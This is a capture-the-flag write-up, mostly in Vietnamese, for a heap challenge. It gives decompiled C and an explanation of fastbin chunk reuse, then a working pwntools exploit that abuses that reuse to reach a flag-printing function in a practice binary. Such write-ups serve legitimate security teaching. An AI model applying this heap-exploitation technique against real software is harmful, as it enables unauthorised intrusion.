# Heap1

## Mitigation

```text
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x3ff000)
```

## source code

```c
void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
{
  int choice; // eax

  setup();
  puts("Ez heap challange !");
  while ( 1 )
  {
    while ( 1 )
    {
      menu();
      choice = readnum();
      if ( choice != 2 )
        break;
      deleteHeap();
    }
    if ( choice > 2 )
    {
      if ( choice == 3 )
        exit(0);
      if ( choice == 4 )
        win();
      else
LABEL_13:
        puts("no option");
    }
    else
    {
      if ( choice != 1 )
        goto LABEL_13;
      create();
    }
  }
}
```

```c
__int64 win()
{
  if ( !*(&ptr + 2) )
    return 0LL;
  if ( (*(&ptr + 2))[1] == (void *)0xABCDEF )
    catFlag();
  return 0LL;
}
```

```c
__int64 create()
{
  int i; // [rsp+8h] [rbp-18h]
  unsigned int size; // [rsp+Ch] [rbp-14h]
  void **size_4; // [rsp+10h] [rbp-10h]

  for ( i = 0; i <= 8 && (&ptr)[i]; ++i )
    ;
  printf("Input size:");
  size = readnum();
  if ( size > 0x1000 )
    exit(0);
  size_4 = (void **)malloc(16uLL);
  *size_4 = malloc(size);
  (&ptr)[i] = size_4;
  printf("Input data:");
  read_remove_0x10(*size_4, size);
  return 0LL;
}
```

```c
__int64 deleteHeap()
{
  unsigned int v1; // [rsp+4h] [rbp-Ch]
  void *ptr; // [rsp+8h] [rbp-8h]

  printf("Input index:");
  v1 = readnum();
  if ( v1 >= 0xA )
    exit(0);
  if ( (&ptrInBSS)[v1] )
  {
    ptr = *(&ptrInBSS)[v1];
    free((&ptrInBSS)[v1]);
    free(ptr);
    *(&ptrInBSS)[v1] = 0LL;
    (&ptrInBSS)[v1] = 0LL;
    puts("Done ");
  }
  return 0LL;
}
```

Chương trình có 4 chức năng:

* create: tạo 1 heap với size <= 0x1000, có thể tạo tối đa 9 heap, `ptr` có địa chỉ trên vùng nhớ `.bss`. Khi tạo, `ptr` sẽ mang địa chỉ của một vùng nhớ heap có size là 16 byte, vùng nhớ này 8 byte đầu mang địa chỉ của vùng nhớ heap khác có size là `size` byte. Vì dữ liệu nhập vào được giới hạn size, nên không thể sử dụng heap overflow.
* delete: xóa 1 heap, đầu tiên check index của heap phải nhỏ hơn hoặc bằng 9. Sau đó, nếu tại vị trí index có heap thì sẽ free 2 vùng nhớ heap, sau đó gán vị trí index bằng 0, và 8 byte đầu của vùng nhớ heap 16 byte bằng 0.
* win: in ra flag nếu `(*(&ptr + 2))[1] == (void *)0xABCDEF` nghĩa là tại index 2 nếu như 8 byte sau của vùng nhớ heap 16 byte bằng 0xABCDE thì thỏa mãn điều kiện.
* exit: thoát chương trình.

Ta thấy khi delelte heap thì vùng nhớ heap có size bằng với size nhập vào được free trước. Sau đó sẽ đến vùng nhớ 16byte. Chương trình sử dụng libc versuon 2.23, ko có tcache. Vậy nên ta có thể sử dụng cơ chế của fastbin để giải bài. Với các chunks fastbin khi free nó sẽ được đưa vào 1 danh sách liên kết, chunk được free trước sẽ được malloc trước. Và khi malloc một chunk mới, chương trình sẽ xem xét xem có chunk nào đã được free có cùng size với chunk mới cần malloc không, nếu có thì nó sẽ trả về địa chỉ của chunk đó.

## Exploit

```py
p = start()

p.sendlineafter(b'>\n',b'1')
p.sendlineafter(b'size:',b'16')
p.sendlineafter(b'data:',b'a'*16)

p.sendlineafter(b'>\n',b'1')
p.sendlineafter(b'size:',b'16')
p.sendlineafter(b'data:',b'a'*16)

p.sendlineafter(b'>\n',b'1')
p.sendlineafter(b'size:',b'16')
p.sendlineafter(b'data:',b'a'*8 + p64(0xABCDEF))  # a chunks = aaaaaaaa 00ABCDEF
                                                  # b chunks = [a chunks addres] 00000000

## now free, the bins look like this:
## a -> b -> NULL
p.sendlineafter(b'>\n',b'2')
p.sendlineafter(b'index:',b'2')

## now malloc, index 2 will be like this:
## index2 -> a
## a = [b chunks address] 00ABCDEF
## b = [input data]
p.sendlineafter(b'>\n',b'1')
p.sendlineafter(b'size:',b'16')
p.sendlineafter(b'data:',b'a'*16)

## not get flag
p.sendlineafter(b'>\n',b'4')

p.interactive() 
```
